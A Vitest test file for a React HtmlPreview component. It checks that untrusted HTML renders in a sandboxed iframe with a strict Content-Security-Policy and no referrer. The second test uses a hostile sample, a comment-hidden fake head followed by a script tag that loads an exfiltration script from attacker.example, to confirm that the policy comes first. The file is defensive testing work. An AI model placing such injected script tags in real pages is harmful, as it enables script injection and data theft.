// @vitest-environment jsdom

import { cleanup, render } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import { HtmlPreview } from '../HtmlPreview';

afterEach(cleanup);

describe('HtmlPreview', () => {
  it('renders HTML in an isolated script-capable iframe', () => {
    const html =
      '<!doctype html><button onclick="document.body.dataset.clicked=true">Try it</button>';
    const { container } = render(<HtmlPreview html={html} title="Prototype preview" />);

    const frame = container.querySelector('iframe');
    expect(frame).not.toBeNull();
    expect(frame?.getAttribute('title')).toBe('Prototype preview');
    expect(frame?.getAttribute('srcdoc')).toContain(
      '<button onclick="document.body.dataset.clicked=true">Try it</button>',
    );
    expect(frame?.getAttribute('srcdoc')).toContain("default-src 'none'");
    expect(frame?.getAttribute('srcdoc')).toContain("connect-src 'none'");
    expect(frame?.getAttribute('srcdoc')).toMatch(/^<!doctype html><html><head><meta /i);
    expect(frame?.getAttribute('sandbox')).toBe('allow-scripts');
    expect(frame?.getAttribute('sandbox')).not.toContain('allow-same-origin');
    expect(frame?.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('places the security policy before untrusted head-like markup', () => {
    const html = '<!-- <head> --><script src="https://attacker.example/exfiltrate.js"></script>';
    const { container } = render(<HtmlPreview html={html} title="Hostile preview" />);

    const srcDoc = container.querySelector('iframe')?.getAttribute('srcdoc') ?? '';
    expect(srcDoc).toMatch(/^<!doctype html><html><head><meta /i);
    expect(srcDoc.indexOf('Content-Security-Policy')).toBeLessThan(
      srcDoc.indexOf('<!-- <head> -->'),
    );
    expect(srcDoc).toContain('<meta name="referrer" content="no-referrer">');
  });
});
